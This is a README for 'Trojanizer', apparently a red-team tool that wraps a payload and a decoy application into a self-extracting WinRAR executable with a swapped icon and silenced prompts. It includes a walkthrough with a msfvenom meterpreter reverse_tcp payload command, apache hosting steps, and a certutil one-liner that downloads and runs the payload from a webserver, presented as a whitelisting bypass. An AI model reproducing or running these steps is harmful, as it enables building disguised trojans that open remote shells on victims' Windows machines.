[![Version](https://img.shields.io/badge/Trojanizer-v1.1-brightgreen.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-Beta-orange.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-Ubuntu,Kali,Mint,Parrot-blue.svg)]()
[![AUR](https://img.shields.io/aur/license/yaourt.svg)]()


## TROJANIZER
    Version release : v1.1 (Beta)
    Author : pedro ubuntu  [ r00t-3xp10it ]
    Codename: Troia_Revisited
    Distros Supported : Ubuntu, Kali, Mint, Parrot OS
    Suspicious-Shell-Activity (SSA) RedTeam develop @2017

![Trojanizer v1.1-Beta](http://i.cubeupload.com/xLyAG8.png)

<br />

## FRAMEWORK DESCRIPTION
    The Trojanizer tool uses WinRAR (SFX) to compress the two files input by user,
    and transforms it into an SFX executable(.exe) archive. The sfx archive when
    executed it will run both files (our payload and the legit appl at the same time).

    To make the archive less suspicious to target at execution time, trojanizer will
    try to replace the default icon(.ico) of the sfx file with a user-selected one,
    and supress all SFX archive sandbox msgs (Silent=1 | Overwrite=1).

   **'Trojanizer will not build trojans, but from target perspective, it replicates the trojan behavior'**<br />
   (execute the payload in background, while the legit application executes in foreground).


<br /><br /><br />

## DEPENDENCIES (backend applications)
    Zenity (bash-GUIs) | Wine (x86|x64) | WinRAr.exe (installed-in-wine)
    "Trojanizer.sh will download/install all dependencies as they are needed"
    ╔─────────────────────────────────────────────────────────────────────────────────────────╗
    |                                        WARNING:                                         |
    |        It is recomended to edit and config the option: SYSTEM_ARCH=[ your_sys_arch ]    |
    |        in the 'settings' file before attempting to run the tool for the first time.     |
    |        That will instruct Trojanizer to install/run backend appl based on sys arch      |
    ╚─────────────────────────────────────────────────────────────────────────────────────────╝
![Trojanizer v1.1-Beta](http://i.cubeupload.com/nIV8rl.png)<br />

<br />

## PAYLOADS (agents) ACCEPTED
    .exe | .bat | .vbs | .ps1
    "All applications that windows/SFX can auto-extract-execute"

    HINT: If sellected 'SINGLE_EXEC=ON' in the settings file, then
    trojanizer will accept any kind of extension to be inputed. but it
    will depends on a script.bat to execute the payload after extraction.

<br />

## LEGIT APPLICATIONS ACCEPTED
    .exe | .bat | .vbs | .ps1 | .jpg | .bmp | .doc | .ppt | etc ..
    "All applications that windows/SFX can auto-extract-execute"

<br />

## ADVANCED SETTINGS
    ╔─────────────────────────────────────────────────────────────────────────────────────────╗
    |                                        WARNING:                                         |
    |         Trojanizer 'advanced options' are only accessible in the 'settings' file,       |
    |       and they can only be configurated before running the main tool (Trojanizer.sh)    |
    ╚─────────────────────────────────────────────────────────────────────────────────────────╝

   **-- Presetup advanced option**<br />
   Trojanizer can be configurated to execute a program + command before the extraction/execution
   of the two compressed files (SFX archive). This allow users to take advantage of pre-installed
   software to execute a remote command before the actual extraction occurs in target system.
    **If active (ON), trojanizer will asks (sandbox) for the command to be executed**
![Trojanizer v1.1-Beta](http://i.cubeupload.com/ZseeuS.png)<br />


   **-- single_file_execution**<br />
   Lets look at the follow scenario: You have a dll payload to input that you need to execute
   upon extraction, but sfx archives can not execute directly dll files, This setting allow
   users to input one batch script(.bat) that its going to be used to execute the dll payload.
   All that Trojanizer needs to Do its to instruct the SFX archive to extract both files and
   them execute the script.bat (thats contains orders to execute payload.dll).
    **This setting will build sfx archives, but it does not behave like one trojan**
![Trojanizer v1.1-Beta](http://i.cubeupload.com/ptouUv.png)<br />


<br /><br /><br />

## TROJANIZER AND APPL WHITELISTING BYPASSES
    ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
    |   A lot of awesome work has been done by a lot of people, especially @subTee, regarding  application whitelisting  |
    |   bypass, which is eventually what we want: execute arbitrary code abusing Microsoft built-in binaries.            |
    | https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/ |
    ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝



    The follow exercise describes how to use trojanizer and Presetup sfx build-in switch to drop and execute
    any payload using 'certutil' appl whitelisting bypass method discover by @subTee and @enigma0x3 ..


    1º - use metasploit to build our payload
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f exe -o payload.exe

    2º - copy payload.exe to apache2 webroot and start service
         cp payload.exe /var/www/html/payload.exe
         service apache2 start

    3º - edit Trojanizer 'settings' file and activate:
         PRE_SETUP=ON
         SINGLE_EXEC=ON

    4º - running trojanizer tool
         PAYLOAD TO BE COMPRESSED => any_file (it will not matter what you compress)
         script.bat (thats going to execute: any_file) => any_legit_appl.exe (to be executed as decoy)
         PRESETUP FUNTION => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe' , '%TEMP%/payload.exe'; Start-Process '%TEMP%/payload.exe'

    ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
    |      When the sfx archive its executed, it will download payload.exe from our apache2 webserver to target and      |
    |  execute it before extract 'any_file' and 'any_legit_appl.exe' (this last one will be executed to serve as decoy)  |
    ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
    

<br /><br /><br />

## DOWNLOAD/INSTALL
    1º - Download framework from github
         git clone https://github.com/r00t-3xp10it/trojanizer.git

    2º - Set files execution permitions
         cd trojanizer
         sudo chmod +x *.sh

    3º - config framework
         nano settings

    4º - Run main tool
         sudo ./Trojanizer.sh

<br /><br />

## Framework Screenshots
**xsf.conf - execute both files upon extraction (trojan behavior)**
![Trojanizer v1.1-Beta](http://i.cubeupload.com/QJ3D2L.png)<br />
**xsf.conf - single_file_execution + Presetup (advanced options)**
![Trojanizer v1.1-Beta](http://i.cubeupload.com/2wBpQf.png)<br />
**xsf.conf - single_file_execution + Presetup + appl_whitelisting_bypass (certutil)**
![Trojanizer v1.1-Beta](http://i.cubeupload.com/HxEh1J.png)<br />
**xsf.conf - single_file_execution + Presetup + appl_whitelisting_bypass (powershell IEX)**
![Trojanizer v1.1-Beta](http://i.cubeupload.com/dU1DoF.png)<br />
**Final sfx archive with icon changed**<br />
![Trojanizer v1.1-Beta](http://i.cubeupload.com/L1r4hg.png)<br />
**Inside the sfx archive (open with winrar) - trojan behavior**<br />
![Trojanizer v1.1-Beta](http://i.cubeupload.com/4xZdmZ.png)<br />
**Inside the sfx archive (open with winrar) - single_file_execution**<br />
![Trojanizer v1.1-Beta](http://i.cubeupload.com/IGNbwP.png)<br />


<br /><br /><br />

## Video tutorials
**Trojanizer - single_file_execution (not trojan behavior)**<br />
https://www.youtube.com/watch?v=Ze0JkVtKbns<br />

<br />

### Report bugs:
https://github.com/r00t-3xp10it/trojanizer/issues

<br />

## Special thanks:
**@subTee** | **@enigma0x3**

Referencies:<br />
http://acritum.com/software/manuals/winrar/<br />
https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/<br />


## -- Suspicious-Shell-Activity© (SSA) RedTeam develop @2017 --

